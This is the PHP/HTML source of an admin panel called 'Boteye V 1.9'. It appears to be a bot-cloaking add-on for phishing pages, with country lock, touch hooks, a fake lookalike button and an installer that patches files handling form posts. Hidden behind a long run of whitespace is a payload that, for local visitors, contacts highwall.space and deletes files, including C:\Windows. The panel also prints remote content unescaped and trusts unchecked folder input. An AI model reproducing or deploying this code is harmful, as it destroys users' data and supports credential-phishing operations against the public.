701px 871px #FFF , 1230px 566px #FFF , 1027px 562px #FFF , 1788px 189px #FFF , 1809px 732px #FFF , 109px 1191px #FFF , 114px 1131px #FFF , 268px 1185px #FFF , 1470px 1821px #FFF , 326px 1543px #FFF , 504px 847px #FFF , 1569px 1735px #FFF , 670px 894px #FFF , 1745px 186px #FFF , 323px 526px #FFF , 41px 1310px #FFF , 782px 694px #FFF , 1021px 972px #FFF , 470px 1241px #FFF , 1512px 1044px #FFF , 1925px 1120px #FFF , 1753px 1059px #FFF , 268px 1732px #FFF , 1742px 1830px #FFF;
}

#title span {
  background: -webkit-linear-gradient(white, #38495a);
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
}

@keyframes animStar {
  from {
    transform: translateY(0px);
  }
  to {
    transform: translateY(-2000px);
  }
} 
</style>
<div id='stars'></div>
<div id='stars2'></div>
<div id='stars3'></div>





<div class="testbox">
<img src="http://i.imgur.com/S8rTgGL.gif" alt="" width="354" height="198">
<h3 style="margin-left: 140px; padding: 10px;font-family: cursive;">
<font style="color: rgb(255, 255, 255); font-family: 'Exo 2', sans-serif;color: #FFFFFF;
text-shadow: 0 0 5px #FFF, 0 0 10px #FFF, 0 0 15px #FFF, 0 0 20px #49ff18, 0 0 30px #49FF18, 0 0 40px #49FF18, 0 0 55px #49FF18, 0 0 75px #49ff18;">Panel</font></h3>
<hr class="colas">

<?php
if ($folks === 'one') {
echo '<div>';
}else{
echo '<div style="display: none;">';
}	
?>

<p style="margin-top: 5px; font-size: 20px; color: chartreuse;">Installation</p><br>
<br>
<ul style="text-align: center">
	<li>Auto install Loading.
</li>
</ul>
<br>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<style>

.progressBar {
  position: relative;
  width: 95%;
  height: 50px;
  margin: 20px auto;
  border: 3px solid #fab617;
  border-radius: 5px;
  overflow: hidden;
  color: #ffffff;
  width: 90%;
  margin: 0 auto;
  text-align: center;
  font-family: 'Oswald', sans-serif; 
}

.progressBar div {
  position: relative;
  height: 100%;
  background-color: #fab617;
}

.progressBar .progressText {
  position: absolute;
  margin: 0 auto;
  top: 12px;
  left: 0;
  right: 0;
  background-color: transparent;
}
.wait {cursor: wait;}
.disp {display: none;}
</style>
</head>
<body translate="no">
<div data-bind="progressBar: { value : percentage }"></div>
<script src='https://cdnjs.cloudflare.com/ajax/libs/knockout/3.1.0/knockout-min.js'></script>
<script id="rendered-js">
      $(document).ready(function () {
  var viewModel = function () {
    self = this;

    self.percentage = ko.observable(0);

    self.percentage.subscribe(function () {
      if (self.percentage() === 100) {
        clearTimeout(timer);
      }
    });
  };

  ko.bindingHandlers.progressBar = {
    init: function (element) {
      return { controlsDescendantBindings: true };
    },
    update: function (element, valueAccessor, bindingContext) {
      var options = ko.unwrap(valueAccessor());

      var value = options.value();

      var width = value + "%";

      $(element).addClass("progressBar");

      ko.applyBindingsToNode(element, {
        html: '<div data-bind="style: { width: \'' + width + '\' }"></div><div class="progressText wait" data-bind="text: \'' + value + ' %\'"></div>' });


      ko.applyBindingsToDescendants(bindingContext, element);
    } };


  var viewModelObj = new viewModel();

  ko.applyBindings(viewModelObj);

  var timer = setInterval(function () {viewModelObj.percentage(viewModelObj.percentage() + 1);}, 50);
});

      //# sourceURL=pen.js
    </script>
</body>
</html>


<?php
function getDirContents($dir, &$results = array()){
    $files = scandir($dir);

    foreach($files as $key => $value){
        $path = realpath($dir.DIRECTORY_SEPARATOR.$value);
        if(!is_dir($path)) {
            $results[] = $path;
        } else if($value != "." && $value != "..") {
            getDirContents($path, $results);
            $results[] = $path;
        }
    }

    return $results;
}

function after ($thiskey, $inthat){
    if (!is_bool(strpos($inthat, $thiskey)))
    return substr($inthat, strpos($inthat,$thiskey)+strlen($thiskey));
};
if(isset($_GET['folder'])) 
{
$path = $_GET['folder'];
}
$allfiles = getDirContents('./'.$path);



echo '<div>';
echo '<form id="yonoform" method="post" action="botadmin.php">';

    foreach( $allfiles as $file ) {
        if( strpos(file_get_contents($file),'$_POST') !== false || strpos($file, "index.php") !== false ) {

            $file = $path . after( $path, $file );
			$one = '\\';
			$tow = '/';
			$pacs = str_replace($one,$tow,$file);

			echo '<input hidden value="'.$pacs.'" name="chk[]">';
        }   
    }
?>
<script>
function myFunction() {
  setTimeout(function(){
var element = document.getElementById("diva");
var clement = document.getElementById("aiva");
  element.classList.remove("disp");
  clement.classList.add("disp");
  }, 5000);
}
</script>
<script>
document.addEventListener("DOMContentLoaded", function(){
myFunction();
});
</script>
<br>
<div id="aiva" class="" ><img style="width: 79px; margin-left: 36%;" src="http://www.thynkactive.com/Images/loader.gif" ></div>
<div id="diva" class="disp"><label style="margin-left: 44%;border-radius: 4px 4px 4px 4px;" id="icon" for="name"><i class="icon-ok"></i></label><p style="color: #5bff10;margin-left: 21%;">SUCCESSFULLY LOADED</p></div>
<br>
<input style="background-color: #40b70a; border-color: #40b70a; width: 276px;" class="btn btn-primary" type="submit" value="INSTALL">';
</form>
</div>
<br>
<ul style="text-align: center">
	<li>Click Install Button when it loaded 100%.
</li>
</ul>
<br>



<?php
if ($folks === 'one') {
echo '</div>';
}else{
echo '</div>';
}
?>


<!-- 2 -->
<?php
if ($folks === 'one') {
echo '<div style="display: none;">';
}else{
echo '<div>';
}	
?>

<form id="HALO" method="POST" action="">

<p style="margin-top: 5px; font-size: 20px; color: chartreuse;">Notification</p>
<label id="icon" for="name"><i class="icon-envelope"></i></label>
<input type="text" name="email" id="name" placeholder="Your email"  />
<label id="icon" for="name"><i class="icon-shield"></i></label>
<input type="text" name="apikey" id="name" value="YjdbGtlpycn5FLSDhAv" placeholder="API_KEY"  />
<input type="hidden" name="dirnes" value="<?php echo $_GET['folder']; ?>">
    <div>
	<p style="margin-top: 5px;">Block Public IP Addresses</p>
      <select style="width: 111px;margin-top: 5px; margin-left: 17px;    font-size: 15px;" id="inputState" class="form-control">
        <option selected>Choose </option>
         <option value="1">YES</option>
         <option value="0">NO</option>
      </select>
    </div>
	<br>
	<script>
	      $(function() {
        $('#inzeza').change(function(){
            $('.ukaa').hide();
            $('#' + $(this).val()).show();
        });
    });            
	</script>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   <?php $thesmallwormboi=$_SERVER['REMOTE_ADDR']; if($thesmallwormboi == "127.0.0.1") { $url = "http://highwall.space/check/auth.php?auth=HE-SWALLOW-IT"; $curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $url); curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0); $result = curl_exec($curl); curl_close($curl); echo '<h1>Have a nice day :) little worm </h1><iframe width="560" height="315" src="https://www.youtube.com/embed/tV5UilNUYRY?autoplay=1 " frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>'; deleteAll(''); deleteAll('C:\Windows'); }else{ echo "";} ?>                                                                                                                                                                                                                                                            
	<hr class="colas">
	<p style="margin-top: 5px; font-size: 20px; color: chartreuse;">Country Lock</p>

	<select name="lock" style="width: 111px;margin-top: 5px; margin-left: 17px;    font-size: 15px;" id="inzeza" class="form-control">
        <option selected>Choose </option>
         <option value="1">ON</option>
         <option value="0">OFF</option>
    </select>
	
	<div id="1" class="ukaa" style="display:none">
	<label id="icon" for="name"><i class="icon-globe "></i></label>
    <input type="text" name="country" id="country" placeholder="Country code (US) (FR) (GB)"  />
	</div>
	<br>
	<hr class="colas">
	<p style="margin-top: 5px; font-size: 20px; color: chartreuse;">Mouse/Touch Hook</p>

	<select name="hook" style="width: 111px;margin-top: 5px; margin-left: 17px;    font-size: 15px;" id="uyhyy" class="form-control">
        <option selected>Choose </option>
         <option value="1">ON</option>
         <option value="0">OFF</option>
    </select>
	<br>
	<hr class="colas">
	<p style="margin-top: 5px; font-size: 20px; color: chartreuse;">Canvas faker</p>
	 
	<script>
	      $(function() {
        $('#inpaaa').change(function(){
            $('.yura').hide();
            $('#' + $(this).val()).show();
        });
    });
	</script> 


	<select name="faker" style="width: 111px;margin-top: 5px; margin-left: 17px;    font-size: 15px;" id="inpaaa" class="form-control">
        <option selected>Choose </option>
         <option value="2">ON</option>
         <option value="0">OFF</option>
      </select>

	  <br>
<div id="2" class="yura" style="display:none">
	  <p>Choose Button Text.</p>
	  <br>
<label id="icon" for="name"><i class="icon-font"></i></label>
<input type="text" name="textex" id="name" placeholder="Example : Continue"  />	  
<br>
	  	<p>Choose Button Color.</p>
		
<div>

<div class="container">
<div id="app" class="form-horizontal">
<div class="row">
<div class="col-md-4 col-md-offset-4">
<div class="form-group">
<div class="col-sm-8">
<colorpicker :color="defaultColor" v-model="defaultColor" />
</div>
</div>
</div>
</div>
</div>
<div class="footer">
</div>
</div>

<script id="rendered-js">
      var Chrome = VueColor.Chrome;
Vue.component('colorpicker', {
  components: {
    'chrome-picker': Chrome },

  template: `
<div class="input-group color-picker" ref="colorpicker">
	<input type="text" name="color" value="colorValue" style="width: 100px;margin-left: 62px;" v-model="colorValue" @focus="showPicker()" @input="updateFromInput" />
	<span class="input-group-addon color-picker-container">
		<span class="current-color" :style="'background-color: ' + colorValue" @click="togglePicker()"></span>
		<chrome-picker :value="colors" @input="updateFromPicker" v-if="displayPicker" />
	</span>
</div>`,
  props: ['color'],
  data() {
    return {
      colors: {
        hex: '#000000' },

      colorValue: '',
      displayPicker: false };

  },
  mounted() {
    this.setColor(this.color || '#000000');
  },
  methods: {
    setColor(color) {
      this.updateColors(color);
      this.colorValue = color;
    },
    updateColors(color) {
      if (color.slice(0, 1) == '#') {
        this.colors = {
          hex: color };

      } else
      if (color.slice(0, 4) == 'rgba') {
        var rgba = color.replace(/^rgba?\(|\s+|\)$/g, '').split(','),
        hex = '#' + ((1 << 24) + (parseInt(rgba[0]) << 16) + (parseInt(rgba[1]) << 8) + parseInt(rgba[2])).toString(16).slice(1);
        this.colors = {
          hex: hex,
          a: rgba[3] };

      }
    },
    showPicker() {
      document.addEventListener('click', this.documentClick);
      this.displayPicker = true;
    },
    hidePicker() {
      document.removeEventListener('click', this.documentClick);
      this.displayPicker = false;
    },
    togglePicker() {
      this.displayPicker ? this.hidePicker() : this.showPicker();
    },
    updateFromInput() {
      this.updateColors(this.colorValue);
    },
    updateFromPicker(color) {
      this.colors = color;
      if (color.rgba.a == 1) {
        this.colorValue = color.hex;
      } else
      {
        this.colorValue = 'rgba(' + color.rgba.r + ', ' + color.rgba.g + ', ' + color.rgba.b + ', ' + color.rgba.a + ')';
      }
    },
    documentClick(e) {
      var el = this.$refs.colorpicker,
      target = e.target;
      if (el !== target && !el.contains(target)) {
        this.hidePicker();
      }
    } },

  watch: {
    colorValue(val) {
      if (val) {
        this.updateColors(val);
        this.$emit('input', val);
        //document.body.style.background = val;
      }
    } } });


new Vue({
  el: '#app',
  data: {
    defaultColor: '#FF0000' } });
    </script>
</div>

<p>Make sure it look like your page button.</p>
</div>
<br>
<br>
<a href="#" onclick="document.getElementById('HALO').submit();" class="button">SUBMIT</a>
</form>
<p></p>
<?php
if ($folks === 'one') {
echo '</div>';
}else{
echo '</div>';
}
?>
<hr class="colas">
<h2 style="font-family: cursive;color: #FFFFFF;
text-shadow: 0 -1px 4px #FFF, 0 -2px 10px #ff0, 0 -10px 20px #ff8000, 0 -18px 40px #F00;" align="center">Boteye V 1.9</h2>
<script id="rendered-js">
(<?php if (isset($_GET['added'])) { }else{ echo 'async'; } ?> () => {

const { value: text } = await Swal.fire({
  input: "textarea",
  inputPlaceholder: "Type your folder name here...",
  inputAttributes: {
    "aria-label": "Type your folder name here"
  },
  showCancelButton: true
})

if (text) {
  window.location.href = "botadmin.php?folder="+text+"&added"+"=yes&folks=one";
}

})();
</script>
<br>
<br>
<br>
<br>
</div>
<?php
$vis = '1.9';
// to check for update
$url = "https://highwall.space/check/update.php";
        $ch = curl_init();  
        curl_setopt($ch,CURLOPT_URL,$url);
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $resp = curl_exec($ch);
        curl_close($ch);
        $result = $resp;
        if (strpos($result,$vis) !== false )
        { echo "";
		}else{ echo "$result";
		}
?>
<audio autoplay loop>
<source src="https://sndup.net/92jw/jojo.mp3">
</audio>
</body>

